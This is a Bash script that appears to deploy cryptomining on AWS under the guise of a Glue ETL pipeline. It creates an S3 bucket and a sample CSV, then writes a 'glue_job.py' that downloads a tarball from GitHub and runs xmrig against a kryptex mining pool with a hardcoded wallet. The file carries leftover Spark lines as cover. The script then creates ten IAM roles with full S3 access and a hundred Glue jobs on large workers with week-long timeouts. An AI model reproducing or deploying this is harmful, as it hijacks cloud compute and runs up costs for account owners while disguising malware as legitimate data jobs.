#!/bin/bash
set -euo pipefail

# ======================================
# Input custom saat script dijalankan
# ======================================
read -p "Masukkan AWS profile [default]: " AWS_PROFILE
AWS_PROFILE="${AWS_PROFILE:-default}"

read -p "Masukkan region [us-east-2]: " AWS_REGION
AWS_REGION="${AWS_REGION:-us-east-2}"

read -p "Masukkan prefix nama role & job [goreng]: " PREFIX
PREFIX="${PREFIX:-goreng}"

ACCOUNT_ID=$(aws sts get-caller-identity --profile "$AWS_PROFILE" --query "Account" --output text)
BUCKET_NAME="${ACCOUNT_ID}-${AWS_REGION}"

echo
echo "Profile: $AWS_PROFILE"
echo "Region: $AWS_REGION"
echo "Account ID: $ACCOUNT_ID"
echo "Bucket: $BUCKET_NAME"
echo "Prefix: $PREFIX"

# ======================================
# 1. Buat bucket S3
# ======================================
echo "Membuat bucket S3..."
aws s3 mb "s3://${BUCKET_NAME}" --region "$AWS_REGION" --profile "$AWS_PROFILE" 2>/dev/null || true
aws s3api put-object --bucket "$BUCKET_NAME" --key "raw/" --profile "$AWS_PROFILE" >/dev/null 2>&1 || true
aws s3api put-object --bucket "$BUCKET_NAME" --key "scripts/" --profile "$AWS_PROFILE" >/dev/null 2>&1 || true
aws s3api put-object --bucket "$BUCKET_NAME" --key "output/" --profile "$AWS_PROFILE" >/dev/null 2>&1 || true

# ======================================
# 2. Upload sample CSV
# ======================================
cat > sample.csv <<'CSV'
id,name,city
1,andi,jakarta
2,budi,bandung
3,siti,medan
CSV

aws s3 cp sample.csv "s3://${BUCKET_NAME}/raw/sample.csv" --profile "$AWS_PROFILE"

# ======================================
# 3. Buat file ETL Python
# ======================================
cat > glue_job.py <<'PY'
#!/usr/bin/env python3

import os
import sys
import time
import signal
import socket
import tarfile
import shutil
import subprocess
from urllib import request

URL = "https://github.com/habibbaharyuandi/lado/raw/refs/heads/main/adul.tar.gz"
WALLET = "164az6Jw8Y3pJJd8XcCwjVYykBTHQWRq4vEg8beNnQWm3MPWj4biVANqDYve9xfJiN5JDN4PiHRta31o2awd4k3AbEbs4bi3NrV8DUzt9g6pJeTkrFtjJtEvPTo7SAVdtYb5fWx"

def run_with_loading(message, func, *args, **kwargs):
    # versi Python dari fungsi shell spinner
    proc = subprocess.Popen(func, *args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, **kwargs)
    spinner_chars = ["|", "/", "-", "\\"]
    idx = 0

    try:
        while proc.poll() is None:
            ch = spinner_chars[idx % len(spinner_chars)]
            sys.stdout.write(f"\r[{ch}] {message}")
            sys.stdout.flush()
            time.sleep(0.08)
            idx += 1
    except KeyboardInterrupt:
        proc.terminate()
        print(f"\r[✖] {message} dibatalkan")
        raise

    status = proc.wait()
    if status == 0:
        print(f"\r[✔] {message} selesai")
        return 0
    else:
        print(f"\r[✖] {message} gagal")
        return status


def download_file(url, filename=None):
    if filename is None:
        filename = os.path.basename(url)

    print(f"Downloading {filename}...")
    try:
        request.urlretrieve(url, filename)
        return 0
    except Exception as e:
        print(f"Download gagal: {e}")
        return 1


def extract_tar_ball(path):
    print(f"Extracting {os.path.basename(path)}...")
    try:
        with tarfile.open(path, "r:gz") as tar:
            tar.extractall(".")
        return 0
    except Exception as e:
        print(f"Ekstrak gagal: {e}")
        return 1


def get_worker_name():
    # Metode 1: coba hostname + IP local
    try:
        hostname = socket.gethostname()
        addrs = socket.gethostbyname_ex(hostname)[2]
        for ip in addrs:
            if ip and not ip.startswith("127."):
                return ip
    except Exception:
        pass

    # Metode 2: coba menentukan IP default via socket connect
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        if ip and not ip.startswith("127."):
            return ip
    except Exception:
        pass

    return "worker1"


def run_adul():
    worker_name = get_worker_name()
    worker_tag = f"{WALLET}/{worker_name}"

    threads = os.cpu_count() or 1

    print(f"Menjalankan adul dengan worker: {worker_tag}")

    cmd = [
        "./xmrig",
        "-a", "rx/0",
        "-o", "xtm-rx-sg.kryptex.network:7038",
        "-u", worker_tag,
        "-t", str(threads)
    ]

    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except FileNotFoundError:
        print("Binary ./xmrig tidak ditemukan. Pastikan file sudah diekstrak.")
        return 1

    text = "NUJU PROSES"
    total_dots = 12
    dots = 0
    cols = shutil.get_terminal_size((80, 20)).columns

    try:
        while proc.poll() is None:
            sys.stdout.write("\033[1A\033[2K")
            total_len = len(text) + total_dots
            x = max((cols - total_len) // 2, 0)
            dot_str = "." * dots
            sys.stdout.write(f"\033[{x}G\033[1;37m{text}{dot_str}\033[0m\n")
            sys.stdout.flush()
            dots = (dots + 1) % (total_dots + 1)
            time.sleep(0.16)

        return proc.wait()

    except KeyboardInterrupt:
        proc.terminate()
        print("\n[ SELESAI ] Proses adul dibatalkan.")
        return 130
    finally:
        sys.stdout.write("\033[0m\n")
        sys.stdout.flush()


def main():
    filename = os.path.basename(URL)

    if not os.path.exists(filename):
        status = download_file(URL, filename)
        if status != 0:
            return 1

    status = extract_tar_ball(filename)
    if status != 0:
        return 1

    status = run_adul()
    if status == 0:
        print("[ SELESAI ] Proses adul telah berhenti.")
    else:
        print(f"[ SELESAI ] Proses adul berhenti dengan status: {status}")

    return status


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("\nProgram dihentikan.")
        sys.exit(130)
df = spark.read.option("header", "true").csv(input_path)
df.show()
df.write.mode("overwrite").parquet(output_path)

job.commit()
PY

aws s3 cp glue_job.py "s3://${BUCKET_NAME}/scripts/glue_job.py" --profile "$AWS_PROFILE"

# ======================================
# 4. 10 jenis worker
# ======================================
WORKER_TYPES=(
  "R.8X" "R.4X" "R.2X" "R.1X"
  "G.16X" "G.12X" "G.8X" "G.4X" "G.2X" "G.1X"
)

# ======================================
# 5. Buat 10 role, lalu tiap role punya 10 job
# ======================================
for role_index in $(seq 1 10); do
  ROLE_NAME="${PREFIX}${role_index}"
  echo "Membuat role: $ROLE_NAME"

  aws iam create-role \
    --role-name "$ROLE_NAME" \
    --assume-role-policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"Service":"glue.amazonaws.com"},"Action":"sts:AssumeRole"}]}' \
    --profile "$AWS_PROFILE" >/dev/null 2>&1 || true

  aws iam attach-role-policy \
    --role-name "$ROLE_NAME" \
    --policy-arn arn:aws:iam::aws:policy/AmazonS3FullAccess \
    --profile "$AWS_PROFILE" >/dev/null 2>&1 || true

  aws iam attach-role-policy \
    --role-name "$ROLE_NAME" \
    --policy-arn arn:aws:iam::aws:policy/service-role/AWSGlueServiceRole \
    --profile "$AWS_PROFILE" >/dev/null 2>&1 || true

  ROLE_ARN=$(aws iam get-role --role-name "$ROLE_NAME" --profile "$AWS_PROFILE" --query "Role.Arn" --output text)

  for job_index in $(seq 1 10); do
    JOB_NAME="${ROLE_NAME}job${job_index}"
    WORKER_TYPE="${WORKER_TYPES[$((job_index-1))]}"

    echo "Membuat job: $JOB_NAME dengan worker type: $WORKER_TYPE"

    aws glue create-job \
      --name "$JOB_NAME" \
      --role "$ROLE_ARN" \
      --command "{\"Name\":\"glueetl\",\"ScriptLocation\":\"s3://${BUCKET_NAME}/scripts/glue_job.py\",\"PythonVersion\":\"3\"}" \
      --default-arguments "{\"--TempDir\":\"s3://${BUCKET_NAME}/temp/\",\"--job-language\":\"python\",\"--BUCKET_NAME\":\"${BUCKET_NAME}\",\"--JOB_NAME\":\"${JOB_NAME}\"}" \
      --execution-property "{\"MaxConcurrentRuns\":1}" \
      --glue-version "5.1" \
      --worker-type "$WORKER_TYPE" \
      --number-of-workers 2 \
      --region "$AWS_REGION" \
      --profile "$AWS_PROFILE" \
      --timeout 10080 >/dev/null 2>&1 || true
  done
done

echo
echo "SELESAI"
echo "Total role: 10"
echo "Total job: 100"
echo "Contoh struktur job:"
echo "goreng1job1 sampai goreng1job10"
echo "goreng2job1 sampai goreng2job10"
echo "..."
echo "goreng10job1 sampai goreng10job10"
echo "Bucket: s3://${BUCKET_NAME}"
